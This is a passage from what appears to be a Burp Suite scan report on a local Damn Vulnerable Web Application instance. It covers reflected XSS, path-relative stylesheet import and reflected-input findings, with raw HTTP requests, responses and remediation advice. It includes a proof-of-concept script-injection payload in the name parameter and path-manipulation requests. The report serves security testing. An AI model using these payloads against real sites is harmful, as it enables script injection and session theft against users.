<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:58 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/<span class="HIGHLIGHT">index.php/t0bj5s/lb92z1/d7398k/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=bhnm86965q0nmp6rt9k5o39sma<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:23 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/xss_d/index.php/t0bj5s/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=bhnm86965q0nmp6rt9k5o39sma<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:23 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="31.4">31.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#31.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#32.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_d/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">x23y5uvxed</span>; PHPSESSID=bhnm86965q0nmp6rt9k5o39sma<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:19 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=bhnm86965q0nmp6rt9k5o39sma; path=/<br>Set-Cookie: security=low<br>Content-Length: 4612<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_d&amp;security=low<span class="HIGHLIGHT">x23y5uvxed</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=xss_d&amp;security=low<span class="HIGHLIGHT">x23y5uvxed</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="32">32.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_r/</span>
<br><a class="PREVNEXT" href="#31">Previous</a>
&nbsp;<a class="PREVNEXT" href="#33">Next</a>
<br>
<span class="BODH1" id="32.1">32.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#31.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#32.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_r/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>name</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>olqab&lt;script&gt;alert(1)&lt;/script&gt;oduo3</b> was submitted in the name parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_r/?name=rrcKFjCb<span class="HIGHLIGHT">olqab%3cscript%3ealert(1)%3c%2fscript%3eoduo3</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=kum71ao3ms7as946ueiohgc1c9<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_r/?name=bNaoCMeU<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:15 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>X-XSS-Protection: 0<br>Content-Length: 4258<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;pre&gt;Hello rrcKFjCb<span class="HIGHLIGHT">olqab&lt;script&gt;alert(1)&lt;/script&gt;oduo3</span>&lt;/pre&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="32.2">32.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#32.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#32.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_r/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=t7slfebjk5sqdh6h445ekq8v8v<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:58 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>X-XSS-Protection: 0<br>Content-Length: 4198<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_r/<span class="HIGHLIGHT">index.php/fg81s0/r7mxz7/a8xjym/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=t7slfebjk5sqdh6h445ekq8v8v<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>X-XSS-Protection: 0<br>Content-Length: 4198<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/xss_r/index.php/fg81s0/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=t7slfebjk5sqdh6h445ekq8v8v<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>X-XSS-Protection: 0<br>Content-Length: 4198<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="32.3">32.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#32.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#32.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_r/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>name</b> request parameter is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
